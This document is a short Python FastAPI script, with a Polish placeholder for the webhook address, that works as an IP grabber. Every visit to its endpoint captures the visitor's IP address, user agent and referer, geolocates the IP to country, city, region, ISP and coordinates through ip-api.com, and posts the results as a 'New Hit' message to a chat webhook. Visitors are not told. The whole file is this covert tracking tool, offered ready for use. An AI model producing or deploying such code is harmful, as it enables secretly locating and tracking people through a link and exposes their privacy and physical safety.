from fastapi import FastAPI, Request
import requests
import datetime

app = FastAPI()

WEBHOOK = "TU_WKLEJ_WEBHOOK"

def get_location(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}").json()
        return {
            "country": r.get("country"),
            "city": r.get("city"),
            "region": r.get("regionName"),
            "isp": r.get("isp"),
            "lat": r.get("lat"),
            "lon": r.get("lon")
        }
    except:
        return {}

@app.get("/")
async def logger(request: Request):

    ip = request.headers.get("x-forwarded-for", request.client.host)
    user_agent = request.headers.get("user-agent")
    referer = request.headers.get("referer")

    location = get_location(ip)

    data = {
        "content": None,
        "embeds": [
            {
                "title": "New Hit",
                "color": 5814783,
                "fields": [
                    {
                        "name": "IP",
                        "value": str(ip),
                        "inline": True
                    },
                    {
                        "name": "Country",
                        "value": str(location.get("country")),
                        "inline": True
                    },
                    {
                        "name": "City",
                        "value": str(location.get("city")),
                        "inline": True
                    },
                    {
                        "name": "Region",
                        "value": str(location.get("region")),
                        "inline": True
                    },
                    {
                        "name": "ISP",
                        "value": str(location.get("isp")),
                        "inline": False
                    },
                    {
                        "name": "User Agent",
                        "value": str(user_agent)[:1000],
                        "inline": False
                    },
                    {
                        "name": "Referer",
                        "value": str(referer),
                        "inline": False
                    }
                ],
                "footer": {
                    "text": str(datetime.datetime.now())
                }
            }
        ]
    }

    try:
        requests.post(WEBHOOK, json=data)
    except:
        pass

    return {"status": "logged"}
